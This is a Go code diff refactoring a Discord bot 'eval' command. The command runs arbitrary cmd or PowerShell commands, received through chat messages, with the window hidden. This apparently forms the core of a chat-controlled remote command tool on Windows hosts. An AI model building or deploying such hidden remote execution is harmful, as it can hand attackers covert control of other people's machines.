@@ -23,8 +23,6 @@ const (
 	evalBadOutput  string = "🟥 Failed to run command."
 )
 
-type EvalCommand struct{}
-
 func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
 	if len(args) == 0 {
 		_, err := s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
@@ -47,34 +45,34 @@ func (*EvalCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 	}
 
 	cmdName := ""
-	cmdArgs := []string{}
+	cmdArgs := &[]string{}
 
 	if val, ok := utils.CmdShortcuts[args[0]]; ok {
 		cmdName = "cmd"
-		cmdArgs = []string{"/C", val}
+		*cmdArgs = []string{"/C", val}
 	} else if val, ok := utils.PsShortcuts[args[0]]; ok {
 		cmdName = "powershell"
-		cmdArgs = []string{"-Command", val}
+		*cmdArgs = []string{"-Command", val}
 	} else if args[0] == "powershell" || args[0] == "ps" {
 		if len(args) < 2 {
 			_, err := s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
 			return err
 		}
 		cmdName = "powershell"
-		cmdArgs = []string{"-Command", strings.Join(args[1:], " ")}
+		*cmdArgs = []string{"-Command", strings.Join(args[1:], " ")}
 	} else if args[0] == "cmd" {
 		if len(args) < 2 {
 			_, err := s.ChannelMessageSendReply(m.ChannelID, evalArgsError+"\nUsage: "+evalUsage, m.Reference())
 			return err
 		}
 		cmdName = "cmd"
-		cmdArgs = []string{"/C", strings.Join(args[1:], " ")}
+		*cmdArgs = []string{"/C", strings.Join(args[1:], " ")}
 	} else {
 		_, err := s.ChannelMessageSendReply(m.ChannelID, evalUseError+"\nUsage: "+evalUsage, m.Reference())
 		return err
 	}
 
-	cmd := exec.Command(cmdName, cmdArgs...)
+	cmd := exec.Command(cmdName, *cmdArgs...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
@@ -120,3 +118,5 @@ func (*EvalCommand) Name() string {
 func (*EvalCommand) Info() string {
 	return "runs a command on cmd or powershell"
 }
+
+type EvalCommand struct{}
